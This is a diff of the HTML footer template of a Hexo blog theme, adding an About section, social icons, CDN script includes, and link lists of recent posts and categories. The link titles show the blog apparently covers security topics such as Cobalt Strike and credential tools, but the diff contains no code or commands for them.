+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2017/12/29/cobalt-strike-spawn/">灵活使用 cobalt strike 的 `spa</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/12/29/cobalt-strike-dns/">对 Cobalt Strike DNS隧道的理解与</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/12/27/powershell-pic-execute/">通过图片免杀执行远程powershell代码</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/12/26/modify-hacked/">用shell对指定站点进行简单的实时入侵预警</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
         
-      </ul>
-    </nav>
-  </div>
+        <li>
+            <a class="footer-post" href="/categories/CVE/">CVE</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/hash-crack/">hash crack</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/LaZagne/">LaZagne</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/NetRipper/">NetRipper</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/?lang=en">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.instagram.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://dribbble.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://plus.google.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-google-plus"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.behance.net/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-behance"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://500px.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-500px"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:test@example.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
 </footer>
 
-</body>
-</html>
-<!-- styles -->
-<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
-<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+<!-- After footer scripts -->
 
-<!-- jquery -->
-<script src="/lib/jquery/jquery.min.js"></script>
-<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
 <script src="/js/main.js"></script>
-<!-- search -->
-
-<!-- Google Analytics -->
-
-<!-- Baidu Analytics -->
 
 <!-- Disqus Comments -->
 
 
+
+</body>
+
+</html>
